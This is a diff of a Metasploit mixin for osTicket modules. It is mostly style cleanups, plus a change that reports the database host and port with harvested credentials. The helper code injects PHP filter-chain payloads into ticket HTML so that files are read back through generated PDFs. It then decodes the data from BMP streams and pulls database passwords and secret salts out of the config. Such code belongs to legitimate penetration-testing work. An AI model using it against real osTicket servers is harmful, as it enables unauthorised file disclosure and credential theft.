@@ -4,12 +4,14 @@ require 'zlib'
 require 'nokogiri'
 
 ##
-# Shared helpers for osTicket auxiliary modules 
+# Shared helpers for osTicket auxiliary modules
 ##
 
 module Msf
+  # Shared mixin providing helpers for osTicket auxiliary modules:
+  # HTTP authentication, CSRF extraction, PHP filter-chain payload generation,
+  # PDF exfiltration parsing, and credential/note reporting.
   module Auxiliary::Osticket
-
     include Msf::Exploit::Remote::HttpClient
     include Msf::Exploit::Remote::HTTP::PhpFilterChain
 
@@ -17,19 +19,19 @@ module Msf
     #
     # @param response [Rex::Proto::Http::Response] HTTP response
     # @return [Boolean]
-    def is_osticket?(response)
+    def osticket?(response)
       unless response
-        vprint_error('is_osticket?: No response received (nil)')
+        vprint_error('osticket?: No response received (nil)')
         return false
       end
-      vprint_status("is_osticket?: Response code=#{response.code}, body length=#{response.body.to_s.length}")
+      vprint_status("osticket?: Response code=#{response.code}, body length=#{response.body.to_s.length}")
       unless response.code == 200
-        vprint_error("is_osticket?: Non-200 response code: #{response.code}")
+        vprint_error("osticket?: Non-200 response code: #{response.code}")
         return false
       end
 
       found = response.body.match?(/osTicket/i)
-      vprint_status("is_osticket?: osTicket signature #{found ? 'FOUND' : 'NOT found'} in response body")
+      vprint_status("osticket?: osTicket signature #{found ? 'FOUND' : 'NOT found'} in response body")
       found
     end
 
@@ -106,7 +108,7 @@ module Msf
         # which already contain the authenticated OSTSESSID
         session_cookies = res.get_cookies
         session_cookies = cookies_for_post if session_cookies.empty?
-        vprint_good("osticket_login_scp: Login SUCCESS")
+        vprint_good('osticket_login_scp: Login SUCCESS')
         return session_cookies
       end
 
@@ -172,7 +174,7 @@ module Msf
         # which already contain the authenticated OSTSESSID
         session_cookies = res.get_cookies
         session_cookies = cookies_for_post if session_cookies.empty?
-        vprint_good("osticket_login_client: Login SUCCESS")
+        vprint_good('osticket_login_client: Login SUCCESS')
         return session_cookies
       end
 
@@ -248,9 +250,9 @@ module Msf
       lock_uri = normalize_uri(base_uri, 'scp', 'ajax.php', 'lock', 'ticket', ticket_id.to_s)
       vprint_status("acquire_lock_code: POST #{lock_uri}")
       res = send_request_cgi(
-        'method'  => 'POST',
-        'uri'     => lock_uri,
-        'cookie'  => cookies,
+        'method' => 'POST',
+        'uri' => lock_uri,
+        'cookie' => cookies,
         'headers' => { 'X-Requested-With' => 'XMLHttpRequest' }
       )
       return '' unless res&.code == 200
@@ -262,6 +264,7 @@ module Msf
           return data['code'].to_s
         end
       rescue JSON::ParserError
+        vprint_status('acquire_lock_code: Response is not JSON, trying plain text')
       end
 
       # Sometimes returned as plain text
@@ -289,9 +292,9 @@ module Msf
 
       vprint_status("submit_ticket_reply: GET #{ticket_uri}?id=#{ticket_id} to fetch CSRF token")
       res = send_request_cgi(
-        'method'   => 'GET',
-        'uri'      => ticket_uri,
-        'cookie'   => cookies,
+        'method' => 'GET',
+        'uri' => ticket_uri,
+        'cookie' => cookies,
         'vars_get' => { 'id' => ticket_id }
       )
       unless res
@@ -311,47 +314,47 @@ module Msf
       vprint_status("submit_ticket_reply: Using textarea field '#{textarea_name}', payload=#{html_content.length} bytes")
 
       post_vars = if prefix == '/scp'
-        # Parse from_email_id from the page (default "1" if not found)
-        from_email_id = '1'
-        email_match = res.body.match(/name="from_email_id"[^>]*value="([^"]*)"/) ||
-                      res.body.match(/value="([^"]*)"[^>]*name="from_email_id"/)
-        from_email_id = email_match[1] if email_match
+                    # Parse from_email_id from the page (default "1" if not found)
+                    from_email_id = '1'
+                    email_match = res.body.match(/name="from_email_id"[^>]*value="([^"]*)"/) ||
+                                  res.body.match(/value="([^"]*)"[^>]*name="from_email_id"/)
+                    from_email_id = email_match[1] if email_match
 
-        # Fall back to parsing lockCode from page HTML if AJAX didn't return one
-        if lock_code.empty?
-          lc_match = res.body.match(/name="lockCode"[^>]*value="([^"]+)"/) ||
-                     res.body.match(/value="([^"]+)"[^>]*name="lockCode"/)
-          lock_code = lc_match[1] if lc_match
-        end
+                    # Fall back to parsing lockCode from page HTML if AJAX didn't return one
+                    if lock_code.empty?
+                      lc_match = res.body.match(/name="lockCode"[^>]*value="([^"]+)"/) ||
+                                 res.body.match(/value="([^"]+)"[^>]*name="lockCode"/)
+                      lock_code = lc_match[1] if lc_match
+                    end
 
-        {
-          '__CSRFToken__'   => csrf,
-          'id'              => ticket_id,
-          'msgId'           => '',
-          'a'               => 'reply',
-          'lockCode'        => lock_code.to_s,
-          'from_email_id'   => from_email_id,
-          'reply-to'        => 'all',
-          'cannedResp'      => '0',
-          'draft_id'        => '',
-          textarea_name     => html_content,
-          'signature'       => 'none',
-          'reply_status_id' => '1'
-        }
-      else
-        {
-          '__CSRFToken__' => csrf,
-          'id'            => ticket_id,
-          'a'             => 'reply',
-          textarea_name   => html_content
-        }
-      end
+                    {
+                      '__CSRFToken__' => csrf,
+                      'id' => ticket_id,
+                      'msgId' => '',
+                      'a' => 'reply',
+                      'lockCode' => lock_code.to_s,
+                      'from_email_id' => from_email_id,
+                      'reply-to' => 'all',
+                      'cannedResp' => '0',
+                      'draft_id' => '',
+                      textarea_name => html_content,
+                      'signature' => 'none',
+                      'reply_status_id' => '1'
+                    }
+                  else
+                    {
+                      '__CSRFToken__' => csrf,
+                      'id' => ticket_id,
+                      'a' => 'reply',
+                      textarea_name => html_content
+                    }
+                  end
 
       vprint_status("submit_ticket_reply: POST #{ticket_uri} with a=reply, id=#{ticket_id}")
       res = send_request_cgi(
-        'method'    => 'POST',
-        'uri'       => ticket_uri,
-        'cookie'    => cookies,
+        'method' => 'POST',
+        'uri' => ticket_uri,
+        'cookie' => cookies,
         'vars_post' => post_vars
       )
       unless res
@@ -409,14 +412,13 @@ module Msf
           vprint_good("download_ticket_pdf: Got PDF (#{res.body.length} bytes)")
           return res.body
         else
-          vprint_warning("download_ticket_pdf: Not a PDF response")
+          vprint_warning('download_ticket_pdf: Not a PDF response')
         end
       end
 
       vprint_error('download_ticket_pdf: All PDF URL patterns failed')
       nil
     end
-
 
     # Builds a minimal 24-bit BMP file header used as a carrier for
     # exfiltrated data. mPDF renders it as an image whose pixel data
@@ -497,7 +499,7 @@ module Msf
     #   Hashes should have :path and optionally :encoding keys.
     # @param is_reply [Boolean] true for ticket reply, false for ticket creation
     # @return [String] HTML payload
-    def generate_ticket_payload(file_specs, is_reply = true)
+    def generate_ticket_payload(file_specs, is_reply: true)
       sep = is_reply ? '&#38;&#35;&#51;&#52;' : '&#34'
 
       payloads = Array(file_specs).map do |spec|
@@ -526,7 +528,7 @@ module Msf
     # @param filter_uri [String] php://filter/... URI
     # @param is_reply   [Boolean] true for ticket reply payload
     # @return [String] HTML payload
-    def wrap_filter_as_ticket_payload(filter_uri, is_reply = true)
+    def wrap_filter_as_ticket_payload(filter_uri, is_reply: true)
       sep = is_reply ? '&#38;&#35;&#51;&#52;' : '&#34'
       "<ul><li style=\"list-style-image:url#{sep}(#{quote_with_forced_uppercase(filter_uri)})\">listitem</li></ul>"
     end
@@ -618,10 +620,10 @@ module Msf
         obj_data = pdf_data[obj_start...obj_end]
 
         # Only process image XObjects
-        next unless obj_data.match?(/\/Subtype\s*\/Image/)
+        next unless obj_data.match?(%r{/Subtype\s*/Image})
 
         # Find stream data within this object
-        stream_idx = obj_data.index("stream")
+        stream_idx = obj_data.index('stream')
         next unless stream_idx
 
         # Skip past "stream" keyword + newline delimiter
@@ -636,7 +638,7 @@ module Msf
         stream_data = stream_data.sub(/\r?\n?\z/, '')
 
         # Decompress if FlateDecode filter is applied
-        if obj_data.match?(/\/Filter\s*\/FlateDecode/) || obj_data.match?(/\/Filter\s*\[.*?\/FlateDecode/)
+        if obj_data.match?(%r{/Filter\s*/FlateDecode}) || obj_data.match?(%r{/Filter\s*\[.*?/FlateDecode})
           begin
             decompressed = Zlib::Inflate.inflate(stream_data)
           rescue Zlib::DataError, Zlib::BufError
@@ -662,15 +664,15 @@ module Msf
     def swap_rgb_bgr(data)
       s = data.dup.force_encoding('ASCII-8BIT')
       len = s.length
-      lim = len - (len % 3)   # process only complete RGB triplets
+      lim = len - (len % 3) # process only complete RGB triplets
 
       i = 0
       while i < lim
         # direct byte swap using getbyte / setbyte is fastest in CRuby
         r = s.getbyte(i)
-        b = s.getbyte(i+2)
-        s.setbyte(i,   b)
-        s.setbyte(i+2, r)
+        b = s.getbyte(i + 2)
+        s.setbyte(i, b)
+        s.setbyte(i + 2, r)
         i += 3
       end
       s
@@ -707,6 +709,13 @@ module Msf
       streams
     end
 
+    def looks_like_base64?(str)
+      return false if str.length < 12 || str.length % 4 != 0
+
+      cleaned = str.tr('A-Za-z0-9+/=', '')
+      cleaned.empty?
+    end
+
     # Extracts file data from a stream containing BMP pixel data.
     # Looks for the ISO-2022-KR escape sequence marker (\x1b$)C),
     # strips null bytes, and decodes (base64 + optional zlib).
@@ -736,13 +745,6 @@ module Msf
       vprint_status("  ascii: #{preview.gsub(/[^\x20-\x7e]/, '.').inspect}")
       vprint_status("  hex:   #{preview.unpack1('H*').scan(/../).join(' ')}")
 
-      # Add this: Check if it looks like base64
-      def looks_like_base64?(str)
-        return false if str.length < 12 || str.length % 4 != 0
-        cleaned = str.tr('A-Za-z0-9+/=', '')
-        cleaned.empty?
-      end
-
       vprint_status("Data looks like base64? #{looks_like_base64?(data)}")
 
       # Conditional processing based on whether it's base64
@@ -751,9 +753,9 @@ module Msf
         vprint_status("extract_data_from_bmp_stream: b64 decoded=#{b64_decoded.length} bytes")
 
         # Preview decoded if successful
-        if b64_decoded.length > 0
+        if !b64_decoded.empty?
           dec_preview = b64_decoded[0, 96]
-          vprint_status("First 96 bytes of b64_decoded:")
+          vprint_status('First 96 bytes of b64_decoded:')
           vprint_status("  ascii: #{dec_preview.gsub(/[^\x20-\x7e]/, '.').inspect}")
           vprint_status("  hex:   #{dec_preview.unpack1('H*').scan(/../).join(' ')}")
         end
@@ -762,9 +764,9 @@ module Msf
         vprint_status("extract_data_from_bmp_stream: zlib decompressed=#{decompressed.length} bytes")
 
         # Preview decompressed if any
-        if decompressed.length > 0
+        if !decompressed.empty?
           zlib_preview = decompressed[0, 96]
-          vprint_status("First 96 bytes of decompressed:")
+          vprint_status('First 96 bytes of decompressed:')
           vprint_status("  ascii: #{zlib_preview.gsub(/[^\x20-\x7e]/, '.').inspect}")
           vprint_status("  hex:   #{zlib_preview.unpack1('H*').scan(/../).join(' ')}")
         end
@@ -773,7 +775,7 @@ module Msf
         return b64_decoded unless b64_decoded.empty?
       else
         # For plain, preview the data itself
-        vprint_status("Treating as plain (non-base64) - preview:")
+        vprint_status('Treating as plain (non-base64) - preview:')
         vprint_status("  ascii: #{data[0, 96].gsub(/[^\x20-\x7e]/, '.').inspect}")
         vprint_status("  hex:   #{data[0, 96].unpack1('H*').scan(/../).join(' ')}")
       end
@@ -795,7 +797,8 @@ module Msf
       while i < data.length
         block = data[i, 4]
         # Stop at non-base64 characters (matches Python's validate=True behavior)
-        break unless block.match?(/\A[A-Za-z0-9+\/=]+\z/)
+        break unless block.match?(%r{\A[A-Za-z0-9+/=]+\z})
+
         begin
           decoded << Rex::Text.decode_base64(block)
         rescue StandardError
@@ -824,13 +827,21 @@ module Msf
         begin
           output << inflater.inflate(data[i, chunk_size])
         rescue Zlib::DataError, Zlib::BufError
-          output << inflater.flush_next_out rescue nil
+          begin
+            output << inflater.flush_next_out
+          rescue StandardError
+            nil
+          end
           break
         end
         i += chunk_size
       end
 
-      output << inflater.finish rescue nil
+      begin
+        output << inflater.finish
+      rescue StandardError
+        nil
+      end
       inflater.close
       output
     end
@@ -853,16 +864,21 @@ module Msf
       secret_patterns = {
         'SECRET_SALT' => /define\('SECRET_SALT','([^']+)'\)/,
         'ADMIN_EMAIL' => /define\('ADMIN_EMAIL','([^']+)'\)/,
-        'DBHOST'      => /define\('DBHOST','([^']+)'\)/,
-        'DBNAME'      => /define\('DBNAME','([^']+)'\)/,
-        'DBUSER'      => /define\('DBUSER','([^']+)'\)/,
-        'DBPASS'      => /define\('DBPASS','([^']+)'\)/
+        'DBTYPE' => /define\('DBTYPE','([^']+)'\)/,
+        'DBHOST' => /define\('DBHOST','([^']+)'\)/,
+        'DBNAME' => /define\('DBNAME','([^']+)'\)/,
+        'DBUSER' => /define\('DBUSER','([^']+)'\)/,
+        'DBPASS' => /define\('DBPASS','([^']+)'\)/
       }
 
       found_any = false
 
       extracted.each do |content|
-        text = content.encode('UTF-8', 'binary', invalid: :replace, undef: :replace, replace: '') rescue next
+        text = begin
+          content.encode('UTF-8', 'binary', invalid: :replace, undef: :replace, replace: '')
+        rescue StandardError
+          next
+        end
 
         secret_patterns.each do |key, pattern|
           match = text.match(pattern)
@@ -880,7 +896,25 @@ module Msf
           case key
           when 'DBPASS'
             db_user_match = text.match(/define\('DBUSER','([^']+)'\)/)
-            report_cred(db_user_match[1], match[1], 'osTicket database') if db_user_match
+            if db_user_match
+              db_host_val = text.match(/define\('DBHOST','([^']+)'\)/)&.[](1) || rhost
+              db_type_val = text.match(/define\('DBTYPE','([^']+)'\)/)&.[](1)&.downcase
+
+              if db_host_val =~ /\A(.+):(\d+)\z/
+                db_address = ::Regexp.last_match(1)
+                db_port = ::Regexp.last_match(2).to_i
+              else
+                db_address = db_host_val
+                db_port = case db_type_val
+                          when 'mysql' then 3306
+                          when 'pgsql', 'postgres' then 5432
+                          when 'mssql' then 1433
+                          else 3306
+                          end
+              end
+
+              report_cred(db_user_match[1], match[1], 'osTicket database', address: db_address, port: db_port)
+            end
           when 'ADMIN_EMAIL'
             report_note(host: rhost, port: rport, type: 'osticket.admin_email', data: { email: match[1] })
           when 'SECRET_SALT'
@@ -895,18 +929,20 @@ module Msf
     # @param username     [String] credential username
     # @param password     [String] credential password
     # @param service_name [String] service label (e.g. 'osTicket database')
-    def report_cred(username, password, service_name)
+    # @param address      [String] host address for the credential (defaults to rhost)
+    # @param port         [Integer] port for the credential (defaults to rport)
+    def report_cred(username, password, service_name, address: rhost, port: rport)
       create_credential(
         module_fullname: fullname,
-        workspace_id:    myworkspace_id,
-        origin_type:     :service,
-        address:         rhost,
-        port:            rport,
-        protocol:        'tcp',
-        service_name:    service_name,
-        username:        username,
-        private_data:    password,
-        private_type:    :password
+        workspace_id: myworkspace_id,
+        origin_type: :service,
+        address: address,
+        port: port,
+        protocol: 'tcp',
+        service_name: service_name,
+        username: username,
+        private_data: password,
+        private_type: :password
       )
     rescue StandardError => e
       vprint_error("Failed to store credential: #{e}")
@@ -926,7 +962,7 @@ module Msf
       topic_select = doc.at('select[@name="topicId"]') || doc.at('select[@id="topicId"]')
       # Skip the blank placeholder option ("-- Select a Help Topic --")
       topic_id = topic_select&.search('option')
-                              &.find { |o| !o['value'].to_s.empty? }
+                             &.find { |o| !o['value'].to_s.empty? }
                               &.[]('value') || '1'
 
       vprint_status("detect_open_form_fields: topicId=#{topic_id}")
@@ -949,16 +985,16 @@ module Msf
       ajax_uri = normalize_uri(base_uri, 'ajax.php', 'form', 'help-topic', topic_id.to_s)
       vprint_status("fetch_topic_form_fields: GET #{ajax_uri}")
 
-      proto   = datastore['SSL'] ? 'https' : 'http'
+      proto = datastore['SSL'] ? 'https' : 'http'
       referer = "#{proto}://#{rhost}:#{rport}#{normalize_uri(base_uri, 'open.php')}"
 
       res = send_request_cgi(
-        'method'  => 'GET',
-        'uri'     => ajax_uri,
-        'cookie'  => cookies,
+        'method' => 'GET',
+        'uri' => ajax_uri,
+        'cookie' => cookies,
         'headers' => {
           'X-Requested-With' => 'XMLHttpRequest',
-          'Referer'          => referer
+          'Referer' => referer
         }
       )
       unless res&.code == 200
@@ -1013,9 +1049,9 @@ module Msf
       tickets_uri = normalize_uri(base_uri, 'tickets.php')
       vprint_status("fetch_ticket_number: GET #{tickets_uri}?id=#{ticket_id}")
       res = send_request_cgi(
-        'method'   => 'GET',
-        'uri'      => tickets_uri,
-        'cookie'   => cookies,
+        'method' => 'GET',
+        'uri' => tickets_uri,
+        'cookie' => cookies,
         'vars_get' => { 'id' => ticket_id }
       )
       unless res&.code == 200
@@ -1023,7 +1059,7 @@ module Msf
         return nil
       end
 
-      match = res.body.match(/<small>#(\d+)<\/small>/)
+      match = res.body.match(%r{<small>#(\d+)</small>})
       if match
         vprint_good("fetch_ticket_number: Ticket number=##{match[1]}")
         return match[1]
@@ -1074,16 +1110,16 @@ module Msf
 
       vprint_status("create_ticket: POST #{open_uri} (topicId=#{topic_id})")
       res = send_request_cgi(
-        'method'    => 'POST',
-        'uri'       => open_uri,
-        'cookie'    => session_cookies,
+        'method' => 'POST',
+        'uri' => open_uri,
+        'cookie' => session_cookies,
         'vars_post' => {
           '__CSRFToken__' => csrf,
-          'a'             => 'open',
-          'topicId'       => topic_id,
-          subject_field   => subject,
-          message_field   => message,
-          'draft_id'      => ''
+          'a' => 'open',
+          'topicId' => topic_id,
+          subject_field => subject,
+          message_field => message,
+          'draft_id' => ''
         }
       )
       unless res
@@ -1139,9 +1175,9 @@ module Msf
       vprint_status("fetch_open_form_fields_scp: GET #{open_uri}?a=open")
 
       res = send_request_cgi(
-        'method'   => 'GET',
-        'uri'      => open_uri,
-        'cookie'   => cookies,
+        'method' => 'GET',
+        'uri' => open_uri,
+        'cookie' => cookies,
         'vars_get' => { 'a' => 'open' }
       )
       unless res&.code == 200
@@ -1158,7 +1194,7 @@ module Msf
         return nil
       end
 
-      first_option = ->(name) {
+      first_option = lambda { |name|
         doc.at("select[@name=\"#{name}\"]")
            &.search('option')
            &.find { |o| !o['value'].to_s.strip.empty? }
@@ -1166,15 +1202,15 @@ module Msf
       }
 
       topic_id = first_option.call('topicId') || '1'
-      dept_id  = first_option.call('deptId')  || '0'
-      sla_id   = first_option.call('slaId')   || '0'
+      dept_id = first_option.call('deptId') || '0'
+      sla_id = first_option.call('slaId') || '0'
 
       vprint_status("fetch_open_form_fields_scp: csrf=#{csrf[0, 8]}... topicId=#{topic_id} deptId=#{dept_id} slaId=#{sla_id}")
       {
-        csrf:           csrf,
-        topic_id:       topic_id,
-        dept_id:        dept_id,
-        sla_id:         sla_id,
+        csrf: csrf,
+        topic_id: topic_id,
+        dept_id: dept_id,
+        sla_id: sla_id,
         session_cookies: res.get_cookies.empty? ? cookies : res.get_cookies
       }
     end
@@ -1194,16 +1230,16 @@ module Msf
       ajax_uri = normalize_uri(base_uri, prefix, 'ajax.php', 'form', 'help-topic', topic_id.to_s)
       vprint_status("fetch_topic_form_fields_scp: GET #{ajax_uri}")
 
-      proto   = datastore['SSL'] ? 'https' : 'http'
+      proto = datastore['SSL'] ? 'https' : 'http'
       referer = "#{proto}://#{rhost}:#{rport}#{normalize_uri(base_uri, prefix, 'tickets.php')}?a=open"
 
       res = send_request_cgi(
-        'method'  => 'GET',
-        'uri'     => ajax_uri,
-        'cookie'  => cookies,
+        'method' => 'GET',
+        'uri' => ajax_uri,
+        'cookie' => cookies,
         'headers' => {
           'X-Requested-With' => 'XMLHttpRequest',
-          'Referer'          => referer
+          'Referer' => referer
         }
       )
       unless res&.code == 200
@@ -1249,17 +1285,17 @@ module Msf
       ajax_uri = normalize_uri(base_uri, prefix, 'ajax.php', 'users', 'local')
       vprint_status("lookup_user_id_scp: GET #{ajax_uri}?q=#{email}")
 
-      proto   = datastore['SSL'] ? 'https' : 'http'
+      proto = datastore['SSL'] ? 'https' : 'http'
       referer = "#{proto}://#{rhost}:#{rport}#{normalize_uri(base_uri, prefix, 'tickets.php')}?a=open"
 
       res = send_request_cgi(
-        'method'   => 'GET',
-        'uri'      => ajax_uri,
-        'cookie'   => cookies,
+        'method' => 'GET',
+        'uri' => ajax_uri,
+        'cookie' => cookies,
         'vars_get' => { 'q' => email },
-        'headers'  => {
+        'headers' => {
           'X-Requested-With' => 'XMLHttpRequest',
-          'Referer'          => referer
+          'Referer' => referer
         }
       )
       unless res&.code == 200
@@ -1294,16 +1330,16 @@ module Msf
       ajax_uri = normalize_uri(base_uri, prefix, 'ajax.php', 'users', 'lookup', 'form')
       vprint_status("fetch_user_form_fields_scp: GET #{ajax_uri}")
 
-      proto   = datastore['SSL'] ? 'https' : 'http'
+      proto = datastore['SSL'] ? 'https' : 'http'
       referer = "#{proto}://#{rhost}:#{rport}#{normalize_uri(base_uri, prefix, 'tickets.php')}?a=open"
 
       res = send_request_cgi(
-        'method'  => 'GET',
-        'uri'     => ajax_uri,
-        'cookie'  => cookies,
+        'method' => 'GET',
+        'uri' => ajax_uri,
+        'cookie' => cookies,
         'headers' => {
           'X-Requested-With' => 'XMLHttpRequest',
-          'Referer'          => referer
+          'Referer' => referer
         }
       )
       unless res&.code == 200
@@ -1356,22 +1392,22 @@ module Msf
       end
 
       ajax_uri = normalize_uri(base_uri, prefix, 'ajax.php', 'users', 'lookup', 'form')
-      proto   = datastore['SSL'] ? 'https' : 'http'
+      proto = datastore['SSL'] ? 'https' : 'http'
       referer = "#{proto}://#{rhost}:#{rport}#{normalize_uri(base_uri, prefix, 'tickets.php')}?a=open"
 
       send_request_cgi(
-        'method'    => 'POST',
-        'uri'       => ajax_uri,
-        'cookie'    => cookies,
+        'method' => 'POST',
+        'uri' => ajax_uri,
+        'cookie' => cookies,
         'vars_post' => {
           email_field => email,
-          name_field  => fullname,
+          name_field => fullname,
           'undefined' => 'Add User'
         },
         'headers' => {
           'X-Requested-With' => 'XMLHttpRequest',
-          'X-CSRFToken'      => csrf,
-          'Referer'          => referer
+          'X-CSRFToken' => csrf,
+          'Referer' => referer
         }
       )
 
@@ -1395,9 +1431,9 @@ module Msf
       vprint_status("fetch_ticket_number_scp: GET #{tickets_uri}?id=#{ticket_id}")
 
       res = send_request_cgi(
-        'method'   => 'GET',
-        'uri'      => tickets_uri,
-        'cookie'   => cookies,
+        'method' => 'GET',
+        'uri' => tickets_uri,
+        'cookie' => cookies,
         'vars_get' => { 'id' => ticket_id }
       )
       unless res&.code == 200
@@ -1405,7 +1441,7 @@ module Msf
         return nil
       end
 
-      match = res.body.match(/<title>Ticket #(\d+)<\/title>/i)
+      match = res.body.match(%r{<title>Ticket #(\d+)</title>}i)
       if match
         vprint_good("fetch_ticket_number_scp: Ticket number=##{match[1]}")
         return match[1]
@@ -1449,7 +1485,7 @@ module Msf
         return [nil, nil]
       end
 
-      ticket_email    = datastore['SCP_TICKET_EMAIL'].to_s
+      ticket_email = datastore['SCP_TICKET_EMAIL'].to_s
       ticket_fullname = datastore['SCP_TICKET_NAME'].to_s
 
       user_id = ensure_user_scp(
@@ -1465,31 +1501,31 @@ module Msf
       vprint_status("create_ticket_scp: POST #{open_uri}?a=open (user_id=#{user_id})")
 
       res = send_request_cgi(
-        'method'    => 'POST',
-        'uri'       => open_uri,
-        'cookie'    => session_cookies,
+        'method' => 'POST',
+        'uri' => open_uri,
+        'cookie' => session_cookies,
         'vars_post' => {
           '__CSRFToken__' => fields[:csrf],
-          'do'            => 'create',
-          'a'             => 'open',
-          'email'         => ticket_email,
-          'name'          => user_id,
-          'reply-to'      => 'all',
-          'source'        => 'Web',
-          'topicId'       => fields[:topic_id],
-          'deptId'        => fields[:dept_id],
-          'slaId'         => fields[:sla_id],
-          'duedate'       => '',
-          'assignId'      => '0',
-          subject_field   => subject,
-          message_field   => message,
-          'cannedResp'    => '0',
-          'append'        => '1',
-          'response'      => '',
-          'statusId'      => '1',
-          'signature'     => 'none',
-          'note'          => '',
-          'draft_id'      => ''
+          'do' => 'create',
+          'a' => 'open',
+          'email' => ticket_email,
+          'name' => user_id,
+          'reply-to' => 'all',
+          'source' => 'Web',
+          'topicId' => fields[:topic_id],
+          'deptId' => fields[:dept_id],
+          'slaId' => fields[:sla_id],
+          'duedate' => '',
+          'assignId' => '0',
+          subject_field => subject,
+          message_field => message,
+          'cannedResp' => '0',
+          'append' => '1',
+          'response' => '',
+          'statusId' => '1',
+          'signature' => 'none',
+          'note' => '',
+          'draft_id' => ''
         }
       )
       unless res
@@ -1503,7 +1539,7 @@ module Msf
         return [nil, nil]
       end
 
-      location  = res.headers['Location'].to_s
+      location = res.headers['Location'].to_s
       ticket_id = location.match(/tickets\.php\?id=(\d+)/i)&.[](1)
       unless ticket_id
         vprint_error("create_ticket_scp: Cannot parse ticket ID from Location: #{location}")
@@ -1541,6 +1577,5 @@ module Msf
 
       prefix == '/scp' ? 'response' : 'message'
     end
-
   end
 end
